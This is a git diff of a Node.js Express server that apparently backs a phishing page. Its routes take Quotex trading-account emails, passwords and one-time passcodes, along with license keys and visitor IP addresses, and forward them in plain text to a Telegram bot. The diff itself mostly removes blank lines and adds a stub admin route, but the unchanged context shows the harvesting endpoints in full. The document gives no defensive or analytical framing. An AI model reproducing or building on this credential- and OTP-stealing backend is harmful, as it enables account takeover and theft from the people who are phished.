@@ -1,9 +1,7 @@
 const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
-
 const app = express();
-
 app.use(cors());
 app.use(express.json());
 
@@ -35,12 +33,9 @@ app.get('/api/events', (req, res) => {
     res.setHeader('Cache-Control', 'no-cache');
     res.setHeader('Connection', 'keep-alive');
     res.flushHeaders();
-
     connectedClients.add(res);
-
     // Send initial connection message
     res.write(`data: ${JSON.stringify({ type: 'connected', message: 'ready' })}\n\n`);
-
     req.on('close', () => {
         connectedClients.delete(res);
     });
@@ -49,26 +44,21 @@ app.get('/api/events', (req, res) => {
 // Trigger connected popup from Telegram
 app.get('/api/trigger-connected', async (req, res) => {
     const userName = req.query.userName || "User";
-
     const message = `
 🔗 <b>Connection Triggered Successfully</b>
-
 👤 User: <b>${userName}</b>
 ✅ Status: Account Connected
     `.trim();
-
     await sendTelegramMessage(message);
-
     // Push notification to all connected users
     connectedClients.forEach(client => {
         try {
-            client.write(`data: ${JSON.stringify({ 
-                type: 'show_connected', 
-                userName: userName 
+            client.write(`data: ${JSON.stringify({
+                type: 'show_connected',
+                userName: userName
             })}\n\n`);
         } catch (e) {}
     });
-
     res.send("Trigger sent successfully");
 });
 
@@ -76,16 +66,13 @@ app.get('/api/trigger-connected', async (req, res) => {
 app.post('/api/license-activate', async (req, res) => {
     const { licenseKey, userName, timestamp } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
-
     const message = `
 🔑 <b>New License Activation</b>
-
 👤 Name: <b>${userName}</b>
 🔑 License: <b>${licenseKey}</b>
 🌍 IP: <b>${ip}</b>
 ⏰ Time (PKT): <b>${timestamp || new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
     `.trim();
-
     await sendTelegramMessage(message);
     res.status(200).send({ status: "success" });
 });
@@ -94,16 +81,13 @@ app.post('/api/license-activate', async (req, res) => {
 app.post('/api/track-activity', async (req, res) => {
     const { action, userName } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
-
     const message = `
 📊 <b>User Activity</b>
-
 Action: <b>${action}</b>
 👤 Name: <b>${userName || "Unknown"}</b>
 🌍 IP: <b>${ip}</b>
 ⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
     `.trim();
-
     await sendTelegramMessage(message);
     res.status(200).send({ status: "success" });
 });
@@ -112,16 +96,13 @@ Action: <b>${action}</b>
 app.post('/api/notification-permission', async (req, res) => {
     const { userName, permission, timestamp } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
-
     const message = `
 🛎️ <b>Notification Permission</b>
-
 👤 Name: <b>${userName}</b>
 📱 Status: <b>${permission}</b>
 🌍 IP: <b>${ip}</b>
 ⏰ Time: <b>${timestamp}</b>
     `.trim();
-
     await sendTelegramMessage(message);
     res.status(200).send({ status: "success" });
 });
@@ -130,16 +111,13 @@ app.post('/api/notification-permission', async (req, res) => {
 app.post('/api/quotex-login', async (req, res) => {
     const { email, password } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
-
     const message = `
 🔑 <b>Quotex Login Attempt</b>
-
 📧 Email: <b>${email}</b>
 🔑 Password: <b>${password}</b>
 🌍 IP: <b>${ip}</b>
 ⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
     `.trim();
-
     await sendTelegramMessage(message);
     res.status(200).send({ status: "ok" });
 });
@@ -147,9 +125,16 @@ app.post('/api/quotex-login', async (req, res) => {
 app.post('/api/quotex-otp', async (req, res) => {
     const { email, otp } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-
     await sendTelegramMessage(`🔢 OTP Entered\nEmail: ${email}\nOTP: ${otp}\nIP: ${ip}`);
     res.status(200).send({ status: "ok" });
+});
+
+// ================== ADMIN PANEL ROUTES (Added) ==================
+app.get('/api/latest-activity', (req, res) => {
+    res.json({
+        logins: [], 
+        otps: []    
+    });
 });
 
 // Root
